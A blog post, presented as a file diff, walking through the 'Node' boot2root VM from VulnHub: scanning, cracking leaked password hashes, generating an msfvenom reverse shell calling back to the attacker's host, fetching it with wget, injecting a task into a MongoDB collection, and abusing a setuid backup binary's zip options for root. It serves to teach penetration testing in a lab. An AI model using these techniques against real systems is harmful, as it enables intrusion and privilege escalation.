@@ -1,0 +1,183 @@
+
+
+Glory Glory Man United
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+31 Aug 2018
+
+
+
+6 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of Node: 1, a boot2root VM created by Rob Carr, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+Node is a medium level boot2root challenge, originally created for HackTheBox. There are two flags to find (user and root flags) and multiple different technologies to play with.
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130
+...
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
+|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
+|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
+3000/tcp open  http    syn-ack ttl 64 Node.js Express framework
+| hadoop-datanode-info:
+|_  Logs: /login
+| hadoop-tasktracker-info:
+|_  Logs: /login
+|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: MyPlace
+
+Nothing unusual. Letâs check out âMyPlaceâ.
+
+Thereâs a LOGIN button at the top right-hand side; it brings us to the login page, of course.
+
+I must say the design looks good.
+AngularJS
+The client side of âMyPlaceâ uses AngularJS. As such, one has to look at the JavaScript files for clues on how to proceed. The go-to tool in my arsenal to do that is the Debugger from the Developer Tools.
+
+Look what happens when I enter the highlighted route into the address bar.
+
+The database exposes all the usersâ password hashes! Letâs clean up the usernames and hashes, and sent it to John the Ripper for offline cracking.
+
+Login to the admin account with credential (myP14ceAdm1nAcc0uNT:manchester).
+
+Voila.
+Click on the Download Backup button to bring up a dialog box to save the plaintext file, myplace.backup because Iâm not going to open a 3.3MB file in the text editor.
+
+File Analysis
+Like any good security analyst worth his salt, Iâm putting on my forensics hat to examine the file in greater details.
+
+If I had to guess, I would say the file myplace.backup is the base64 encoding of the another file.
+
+Iâm right. Now, letâs unzip the bugger.
+
+Hmm. Itâs a password-protected archive. No big deal. Thereâs nothing John the Ripper canât handle.
+# zip2john myplace.backup.zip &gt; myplace.backup.zip.hash
+# john --show --format=pkzip myplace.back.zip.hash
+myplace.backup.zip:magicword:::::myplace.backup.zip
+
+1 password hash cracked, 0 left
+
+Turns out the archive is the backup of the âMyPlaceâ site. And right off the bat, I notice a username and password. I know, Iâm sharp. 
+
+Hereâs the code that generates the file myplace.backup. More on that later.
+
+Low-Privilege Shell
+The rest of the code seems pretty water-tight to me. Iâm guessing the credential (mark:5AYRft73VtFpc84k) could also be the credential to log in through SSH. Letâs give it a shot.
+
+There you have it.
+During enumeration of markâs account, I found the following:
+
+There are other accounts on the system: frank and tom
+
+
+frank is a distraction 
+
+
+tom is running node on /var/scheduler/app.js
+
+
+
+You see, tom is running each command in the tasks collection every 30,000 milliseconds (or thirty seconds). If I can somehow insert a row into tasks, tom will execute it for me.
+Letâs do it this way. We transfer a reverse shell over to the VM.
+Iâve checked uname -a beforehand; I know that itâs running a 64-bit Ubuntu. We generate a reverse shell with msfvenom on my attacking machine like so.
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=1234 -f elf -o rev
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: rev
+
+Host the reverse shell with Pythonâs SimpleHTTPServer module.
+# python -m SimpleHTTPServer 80
+
+Download the reverse shell to /tmp/rev with wget and make it executable.
+
+Mongo Shell
+Itâs time to insert my command to run the reverse shell into the tasks collection.
+
+Sweet. On the attacking machine, I set up a nc listener to receive the reverse shell.
+
+Awesome. But, letâs give ourselves a better looking shell with the Python pseudo-TTY trick.
+
+User Flag
+The user flag is at /home/tom/user.txt.
+
+Privilege Escalation
+Remember /usr/local/bin/backup? Itâs the key to privilege escalationâitâs setuid to root.
+
+Having said that, we need to get a copy of the file to my machine for further analysis.
+On the VM, do the following.
+$ gzip -c &lt; /usr/local/bin/backup &gt; /tmp/backup.gz
+$ base64 &lt; /tmp/backup.gz
+H4sIAL7Zq1kAA+ybe3Qb1Z3HR44ShDGOCYEEyB6G3YRHha2HZckmZWEk62FbtkaS9TIPR4+RRrZe
+lmZkyQ0tWccEE3xOdmGB/WMLu4ez5PTQnu5uT8t2t63TQEKXnt2U0pKewx/p4aUUtrAQktCm0f5+
+d/TyxEDCv+srX/3mc+/9fe9r7pVGM/6G1WlTKBRUPbRR6yikB/cpVQawj+6U0g0UTV1O3UrdSG2j
+NhCG+CCUgUiDA8b1kKaEuA7iOPD4HqUK49XAV9fyFLVIAvhiPEdTFEb0p7qkfJUG4k+UKow5SBAg
+bqjlt4HZDPmbIQ9jBRjjhlodGHkoz0PdGAeBB1vy2LeFmPNGinI+rVSRCGnOlnw35FOrhA1S9ZQH
+8lvbdxbSzrb0T5NKRjSpWHcqmRFLPYVsj17K66rl28d8tbGWNOma7+ba2GG+4asf/eaufzkQdDxL
+X2Z5/PF//N5TliSWv6GmQcaKJq4k7dsjby7L2xtvOd4E8TkZ98g4LeNdMhZlPCbjv5bxbhnfJOOQ
+...
+
+On the attacking machine, reverse the process.
+# echo H4sIAL...AAA== &gt; backup.gz.b64
+# base64 -d &lt; backup.gz.b64 &gt; backup.gz
+# gunzip -c &lt; backup.gz &gt; backup
+
+I observed the following about the program:
+
+The number of arguments must be at least three
+The first argument is: -q
+
+The second argument must be one of the strings in /etc/myplace/keys
+
+The third argument must be a path thatâs not blacklisted.
+
+
+Once the arguments pass the checks, the program will use the system library function to execute zip to create the archive file.
+The program is perfect in all aspects except for thisâit doesnât check for -T and -TT. These options allow zip to test the compression (-T) with an external command (-TT).
+Once we know how /usr/local/bin/backup works, exploiting it to give us a root shell is easy. Letâs reuse our reverse shell in /tmp/rev if you still remember it.
+
+On our nc listener, a root shell returns!
+
+Root Flag
+After spawning the pseudo-TTY shell, retrieving the root flag is a piece-of-cake.
+
+
+Afterthought
+The VM sure has its fair share of troll traps like the one you see below.
+
+Right in the beginning during fuzzing for directories or files, if your User-Agent matches blacklisted ones, e.g. DirBuster, you get to see the troll face plus some random string. And in /usr/local/bin/backup, again if your path contains blacklisted ones, e.g. /root, /etc or even single characters such as ;, &amp; or |, youâll get a ZIP file in base64 encoding, containing root.txt that displays the same troll face.
+It sure was fun.
+
